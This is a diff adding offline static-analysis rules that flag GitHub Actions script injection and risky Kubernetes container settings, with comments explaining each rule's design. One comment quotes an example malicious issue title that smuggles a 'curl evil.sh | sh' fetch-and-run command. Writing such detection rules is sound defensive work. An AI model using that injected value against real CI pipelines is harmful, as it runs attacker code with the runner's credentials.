@@ -1,0 +1,90 @@
+# Curated offline rules for the YAML this fleet is actually made of: CI
+# workflows and Kubernetes manifests (#859).
+#
+# WHY THIS FILE EXISTS. Until 2026-08-15 the entire vendored ruleset was ten
+# Python rules. The engine ran correctly and found nothing outside Python,
+# because there was nothing to find with - so a repo of Ansible, k8s manifests
+# and CI workflows had a SAST capability on paper and zero coverage in fact.
+# Every runner test passed the whole time; the eval scored security-scope 0.00
+# and that was read as a model problem.
+#
+# Same conventions as python.yml: vendored so the review path needs NO network,
+# `metadata.vuln_class` on every rule (the runner DROPS findings without one),
+# high-signal over exhaustive - the LLM exploitability judge prunes the rest.
+rules:
+  # --- CI workflows ------------------------------------------------------
+  #
+  # Script injection is the highest-severity thing that can go wrong in a
+  # workflow file and it looks completely ordinary. `${{ github.event.* }}` is
+  # substituted into the shell BEFORE the shell runs, so an issue titled
+  # `"; curl evil.sh | sh; #` executes on the runner with its token. The safe
+  # form is to pass the value through `env:` and reference "$VAR", which quotes
+  # it as data.
+  - id: grug-gha-run-untrusted-interpolation
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      GitHub Actions script injection: attacker-controllable ${{ github.event.* }}
+      (or head_ref) is interpolated directly into a run: block. The value is
+      substituted before the shell parses the line, so a crafted title, branch
+      name or comment body executes as code on the runner. Pass it through env:
+      and reference the variable in double quotes instead.
+    metadata: {vuln_class: command-injection}
+    patterns:
+      # The `(?:-[ \t]+)?` is load-bearing: a step is a YAML list item, so the
+      # line reads `- run: ...` and an `^\s*run:` anchor matches nothing. The
+      # first draft of this rule was well-formed, passed every structural
+      # test, and caught zero of its own planted vulnerabilities.
+      - pattern-regex: >-
+          (?m)^[ \t]*(?:-[ \t]+)?run:.*\$\{\{[^}]*\bgithub\.(?:event\.[A-Za-z_.\[\]'"-]+|head_ref)[^}]*\}\}
+
+  # The same substitution inside a block scalar. Separate rule rather than one
+  # clever regex: `run: |` puts the dangerous line anywhere in the following
+  # block, and a single pattern trying to span both shapes matched neither
+  # reliably when tested against the engine.
+  - id: grug-gha-run-block-untrusted-interpolation
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      GitHub Actions script injection inside a multi-line run: block -
+      attacker-controllable ${{ github.event.* }} (or head_ref) is substituted
+      into the script before the shell parses it. Pass it through env: and
+      reference the variable in double quotes.
+    metadata: {vuln_class: command-injection}
+    patterns:
+      - pattern-regex: >-
+          (?ms)^[ \t]*(?:-[ \t]+)?run:[ \t]*[|>][^\n]*\n(?:[ \t]+[^\n]*\n){0,40}?[ \t]+[^\n]*\$\{\{[^}]*\bgithub\.(?:event\.[A-Za-z_.\[\]'"-]+|head_ref)[^}]*\}\}
+
+  # --- Kubernetes --------------------------------------------------------
+  - id: grug-k8s-privileged-container
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      Container runs privileged. This disables container isolation almost
+      entirely - the process gets the host's devices and effectively root on the
+      node. Drop it, or narrow to the specific capabilities actually needed.
+    metadata: {vuln_class: iac-misconfig}
+    patterns:
+      - pattern-regex: '(?m)^\s*privileged:\s*true\s*$'
+
+  - id: grug-k8s-allow-privilege-escalation
+    languages: [yaml]
+    severity: WARNING
+    message: >-
+      allowPrivilegeEscalation: true lets a process gain more privileges than
+      its parent (setuid binaries, file capabilities). Set it false unless the
+      workload genuinely needs it.
+    metadata: {vuln_class: iac-misconfig}
+    patterns:
+      - pattern-regex: '(?m)^\s*allowPrivilegeEscalation:\s*true\s*$'
+
+  - id: grug-k8s-host-namespace
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      Pod shares a host namespace (hostNetwork/hostPID/hostIPC). This removes
+      the isolation boundary from the node - host PIDs, host network interfaces
+      or host IPC become visible and reachable from the container.
+    metadata: {vuln_class: iac-misconfig}
+    patterns:
+      - pattern-regex: '(?m)^\s*host(?:Network|PID|IPC):\s*true\s*$'
